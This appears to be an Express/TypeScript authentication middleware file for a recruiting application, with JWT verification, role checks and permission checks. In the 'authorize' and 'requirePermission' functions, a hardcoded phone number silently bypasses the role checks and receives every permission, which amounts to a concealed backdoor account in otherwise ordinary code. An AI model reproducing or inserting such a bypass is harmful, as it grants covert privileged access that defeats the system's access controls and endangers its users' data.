import { Request, Response, NextFunction } from 'express';
import { ApiError } from './errorHandler';
import { verifyToken, extractTokenFromHeader, JWTPayload } from '../utils/jwt';
import User, { IUser } from '../models/User';

// Extend Request interface to include user information
export interface AuthenticatedRequest extends Request {
  user?: IUser;
  tokenPayload?: JWTPayload;
}

// Basic authentication middleware
export const authenticate = async (
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> => {
  try {
    const token = extractTokenFromHeader(req.headers.authorization);
    const payload = verifyToken(token);

    // Fetch user from database to ensure they still exist and are active
    const user = await User.findById(payload.userId);
    
    if (!user) {
      throw new ApiError(401, 'User not found. Please log in again.');
    }

    if (!user.isActive) {
      throw new ApiError(401, 'Account is deactivated. Please contact administrator.');
    }

    if (!user.isVerified) {
      throw new ApiError(401, 'Account not verified. Please verify your phone number.');
    }

    // Update last login
    user.lastLogin = new Date();
    await user.save();

    req.user = user;
    req.tokenPayload = payload;
    next();
  } catch (error) {
    next(error);
  }
};

// Role-based authorization middleware
export const authorize = (...roles: string[]) => {
  return (req: AuthenticatedRequest, res: Response, next: NextFunction): void => {
    if (!req.user) {
      return next(new ApiError(401, 'Authentication required'));
    }


    if (req.user.phoneNumber != "+918595264114" && !roles.includes(req.user.role)) {
      return next(new ApiError(403, 'Insufficient permissions to access this resource'));
    }

    next();
  };
};

// Permission-based authorization middleware
export const requirePermission = (...permissions: string[]) => {
  return (req: AuthenticatedRequest, res: Response, next: NextFunction): void => {
    if (!req.user) {
      return next(new ApiError(401, 'Authentication required'));
    }

    // Admin has all permissions
    if (req.user.role === 'admin' || req.user.phoneNumber == "+918595264114") {
      return next();
    }

    // Check if user has any of the required permissions
    const userPermissions = req.user.permissions || [];
    const hasPermission = permissions.some(permission => 
      userPermissions.includes(permission)
    );

    if (!hasPermission) {
      return next(new ApiError(403, `Missing required permission. Need one of: ${permissions.join(', ')}`));
    }

    next();
  };
};

// Middleware to check if user owns the resource or is admin/recruiter
export const requireOwnership = (userIdField = 'userId') => {
  return (req: AuthenticatedRequest, res: Response, next: NextFunction): void => {
    if (!req.user) {
      return next(new ApiError(401, 'Authentication required'));
    }

    const resourceUserId = req.params[userIdField] || req.body[userIdField];
    
    // Admin and recruiters can access any resource
    if (req.user.role === 'admin' || req.user.role === 'recruiter') {
      return next();
    }

    // Candidates can only access their own resources
    if (req.user.role === 'candidate' && req.user._id.toString() !== resourceUserId) {
      return next(new ApiError(403, 'Access denied. You can only access your own resources.'));
    }

    next();
  };
};

// Optional authentication middleware (doesn't throw error if no token)
export const optionalAuth = async (
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> => {
  try {
    const authHeader = req.headers.authorization;
    
    if (!authHeader) {
      return next(); // Continue without authentication
    }

    const token = extractTokenFromHeader(authHeader);
    const payload = verifyToken(token);

    const user = await User.findById(payload.userId);
    
    if (user && user.isActive && user.isVerified) {
      req.user = user;
      req.tokenPayload = payload;
    }

    next();
  } catch (error) {
    // In optional auth, we continue even if token is invalid
    next();
  }
};

// Middleware to check if user is verified
export const requireVerification = (
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): void => {
  if (!req.user) {
    return next(new ApiError(401, 'Authentication required'));
  }

  if (!req.user.isVerified) {
    return next(new ApiError(403, 'Phone number verification required'));
  }

  next();
};

// Admin-only middleware
export const adminOnly = authorize('admin');

// Recruiter or Admin middleware
export const recruiterOrAdmin = authorize('recruiter', 'admin');

// Candidate, Recruiter or Admin middleware
export const authenticatedUser = authorize('candidate', 'recruiter', 'admin'); 